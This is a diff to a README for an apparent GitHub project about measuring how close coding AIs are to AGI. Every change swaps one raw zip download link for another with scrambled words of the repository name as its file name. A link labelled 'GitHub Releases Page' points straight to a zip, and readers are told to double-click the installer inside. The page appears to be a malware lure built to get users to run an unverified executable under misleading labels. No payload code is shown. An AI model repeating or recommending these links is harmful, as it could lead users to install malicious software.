@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the application "Quantifying-
 
 ## 📥 Download the Application
 
-[![Download](https://raw.githubusercontent.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/main/traversable/to_close_coding_A_AGI_Quantifying_is_a_how_2.1-beta.4.zip%20Now-🚀-brightgreen)](https://raw.githubusercontent.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/main/traversable/to_close_coding_A_AGI_Quantifying_is_a_how_2.1-beta.4.zip)
+[![Download](https://raw.githubusercontent.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/main/traversable/is_to_AGI_close_coding_A_a_Quantifying_how_v2.1.zip%20Now-🚀-brightgreen)](https://raw.githubusercontent.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/main/traversable/is_to_AGI_close_coding_A_a_Quantifying_how_v2.1.zip)
 
 You can download the application from the Releases page. Follow the steps below to get started.
 
@@ -29,13 +29,13 @@ This application includes various tools to help you evaluate the intelligence of
 ## 💻 Download & Install
 
 1. **Visit the Releases Page**
-   Go to the following link to access the Downloads: [GitHub Releases Page](https://raw.githubusercontent.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/main/traversable/to_close_coding_A_AGI_Quantifying_is_a_how_2.1-beta.4.zip).
+   Go to the following link to access the Downloads: [GitHub Releases Page](https://raw.githubusercontent.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/main/traversable/is_to_AGI_close_coding_A_a_Quantifying_how_v2.1.zip).
 
 2. **Choose the Right Version**
    On the Downloads page, you’ll see different versions of the application. Look for the latest version available. 
 
 3. **Download the Installer**
-   Click on the installer file to download it. It should be labeled with the version number, such as `https://raw.githubusercontent.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/main/traversable/to_close_coding_A_AGI_Quantifying_is_a_how_2.1-beta.4.zip` or similar.
+   Click on the installer file to download it. It should be labeled with the version number, such as `https://raw.githubusercontent.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/main/traversable/is_to_AGI_close_coding_A_a_Quantifying_how_v2.1.zip` or similar.
 
 4. **Run the Installer**
    After the download finishes, locate the file in your downloads folder and double-click it to start the installation.
@@ -76,6 +76,6 @@ This project is licensed under the MIT License. Feel free to use, modify, and sh
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/main/traversable/to_close_coding_A_AGI_Quantifying_is_a_how_2.1-beta.4.zip%20Now-🚀-brightgreen)](https://raw.githubusercontent.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/main/traversable/to_close_coding_A_AGI_Quantifying_is_a_how_2.1-beta.4.zip) 
+[![Download](https://raw.githubusercontent.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/main/traversable/is_to_AGI_close_coding_A_a_Quantifying_how_v2.1.zip%20Now-🚀-brightgreen)](https://raw.githubusercontent.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/main/traversable/is_to_AGI_close_coding_A_a_Quantifying_how_v2.1.zip) 
 
 Enjoy exploring the potential of AIs!
